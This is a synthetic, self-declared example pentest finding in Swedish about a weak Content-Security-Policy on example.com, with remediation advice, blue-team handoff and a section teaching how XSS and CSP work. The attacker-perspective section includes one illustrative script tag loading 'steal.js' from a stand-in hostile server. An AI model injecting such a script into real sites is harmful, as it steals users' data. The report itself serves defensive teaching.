---
id: F-0001
title: Svag Content-Security-Policy — saknar default-src/script-src (ingen XSS-mitigering)
target: https://example.com (HTTP-svarsheaders)
date: 2026-01-01
severity: Medium
cvss: 5.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
mitre: T1059.007 (JavaScript), T1189 (Drive-by Compromise)
status: open
handoff: blueteam
defense: defenses/EXAMPLE-F-0001-weak-csp.md
---

> 📚 **EXEMPEL — syntetisk data.** Detta är en påhittad demonstration mot `example.com`
> som visar rapportformatet och den pedagogiska nivån. Ingen riktig sårbarhet, inget
> riktigt mål. Använd som mall — ersätt med dina egna fynd mot IN SCOPE-tillgångar.

## Beskrivning
Sidan sätter en Content-Security-Policy, men den innehåller endast `base-uri 'self'` och
`frame-ancestors 'self'`. Det saknas `default-src`, `script-src`, `object-src`, `style-src`
och `form-action`. Utan en `script-src`/`default-src`-restriktion ger CSP:n ingen mitigering
mot XSS/injektion av externa skript. För en app som renderar användargenererat innehåll
(t.ex. kommentarer, chatt eller profiltext) är en stark CSP ett viktigt försvarsdjup mot att
en eventuell XSS kan ladda extern kod eller exfiltrera data. Verifierat: header observerad i svar.

Not: Detta är en härdnings-/defense-in-depth-brist. Ingen faktisk XSS har testats eller
bevisats i denna snabbkoll (skulle kräva djupare, auktoriserad appgranskning).

## Bevis / PoC
```
$ curl -sSI https://example.com/login | grep -i content-security-policy
content-security-policy: base-uri 'self'; frame-ancestors 'self';
```
Ingen `default-src`/`script-src`/`object-src` = skript får laddas från valfri origin ur CSP:ns synvinkel.

## Påverkan
- Om en XSS-lucka finns (t.ex. i kommentars-/profilinnehåll) saknas CSP-broms som annars kunnat
  blockera inline-/extern skriptexekvering och datastöld.
- Ökad blast radius för client-side-attacker; svagare skydd mot magecart-liknande skriptinjektion.

## Reproduktion
1. `curl -sSI https://example.com/login`
2. Granska `content-security-policy`-headern — endast base-uri + frame-ancestors.

## Rekommenderad åtgärd
Inför en restriktiv CSP (t.ex. via middleware/plug som sätter headern), anpassad för appens
behov (WebSocket-realtid, ev. self-hostad analytics). Startpunkt att härda och testa i
report-only först:
```
default-src 'self';
script-src 'self' 'nonce-<per-request>' https://analytics.example.com;
style-src 'self';
img-src 'self' data: https:;
connect-src 'self' wss://example.com https://analytics.example.com;
object-src 'none';
base-uri 'self';
frame-ancestors 'self';
form-action 'self';
```
- Använd nonce för nödvändiga inline-skript; undvik `unsafe-inline` för script.
- Rulla ut via `Content-Security-Policy-Report-Only` + report-uri, verifiera, växla till enforce.

## Handoff till blue team
- Detektion: samla CSP `report-uri`/`report-to`-violations; larma på oväntade script-src-brott.
- Härdning: implementera nonce-baserad CSP; whitelista endast nödvändiga origins.
- Verifiera fix: `curl -I` visar fullständig CSP med `default-src`/`script-src`; report-only utan legitima brott innan enforce.

---

## Metodik / hur gjordes det (pedagogisk)
Detta hittades med **lätt aktiv recon** — ett enda, helt normalt HTTP-anrop:

```
$ curl -sSI https://example.com/login
```
- `-I` betyder "**HEAD-request**": hämta bara svarshuvudena (headers), inte själva sidan.
  Det är minimalt påträngande — vi laddar inte ens ner innehållet.
- Vi läste raden `content-security-policy:` och noterade vilka **direktiv** som fanns
  (`base-uri`, `frame-ancestors`) och — viktigare — vilka som *saknades* (`default-src`,
  `script-src`, `object-src`).

**Varför fungerar metoden?** En CSP är ett kontrakt som servern skickar till webbläsaren i
varje svar. Eftersom den skickas öppet i klartext-headern räcker det att titta på svaret för
att se exakt hur stark (eller svag) policyn är. Att läsa vad som *inte* står där är ofta lika
avslöjande som det som står.

## Varför är detta en risk (angriparens perspektiv)
**Konceptet XSS (Cross-Site Scripting):** en angripare lyckas få in eget JavaScript som körs
i offrets webbläsare på den betrodda sajten — t.ex. genom att skriva `<script>...</script>`
eller en payload i ett fält som sedan visas för andra. Koden kör då med sajtens rättigheter:
den kan läsa sidan, stjäla sessionsdata som är åtkomlig för skript, och skicka data vidare.

**Vad CSP gör — och varför den svaga versionen inte hjälper:** En stark CSP med `script-src`
säger till webbläsaren "kör bara skript från dessa godkända källor". Även om en angripare
lyckas injicera `<script src="https://ond-server/steal.js">`, vägrar webbläsaren att ladda det
eftersom källan inte står på listan. **Men** i det här fallet saknar CSP:n `script-src`/
`default-src` helt — så ur CSP:ns synvinkel får skript laddas från *vilken domän som helst*.
Bromsen finns, men pedalen är frånkopplad.

**Realistisk påverkan:** Om appen **renderar användargenererat innehåll** (meddelanden,
profiltext, kommentarer) är UGC + svag CSP en klassisk kombination: skulle det finnas en enda
plats där indata inte saneras korrekt, kan en angripare lägga en payload som exekverar hos
varje annan användare som ser innehållet (en "stored XSS"). En stark CSP hade begränsat skadan
även vid en sådan bugg. Obs: vi har **inte** bevisat att XSS finns — detta är försvarsdjup,
inte en bekräftad exploaterbar lucka.

## Begrepp & lärdomar
- **CSP (Content-Security-Policy):** en säkerhetsheader där servern listar tillåtna källor
  för olika resurstyper. Ett skyddslager *utöver* korrekt indatasanering, inte en ersättning.
- **`default-src`:** grundregeln som gäller för allt som inte har ett eget direktiv. Utan den
  finns ingen "fallback-broms".
- **`script-src`:** styr varifrån JavaScript får laddas/köras. Det viktigaste direktivet mot XSS.
- **`object-src 'none'`:** blockerar `<object>/<embed>` (gamla plugin-attackytor).
- **`nonce`:** ett slumpvärde per sidladdning som läggs på godkända inline-skript
  (`<script nonce="abc123">`); webbläsaren kör bara skript med rätt nonce. Bättre än `unsafe-inline`.
- **`frame-ancestors 'self'`:** (finns redan) skydd mot **clickjacking** — hindrar att sidan
  bäddas in i en `<iframe>` på en angripares sajt.
- **Report-Only:** `Content-Security-Policy-Report-Only` gör att webbläsaren *rapporterar*
  brott utan att blockera — perfekt för att testa en ny policy utan att råka bryta sajten.
- **MITRE T1059.007 (JavaScript) i klarspråk:** exekvering av angriparens JavaScript i
  webbläsaren — precis det en XSS åstadkommer.

## Läs mer
- OWASP: Cross-Site Scripting (XSS) — https://owasp.org/www-community/attacks/xss/
- OWASP Cheat Sheet: Content Security Policy — https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- MDN: Content-Security-Policy — https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
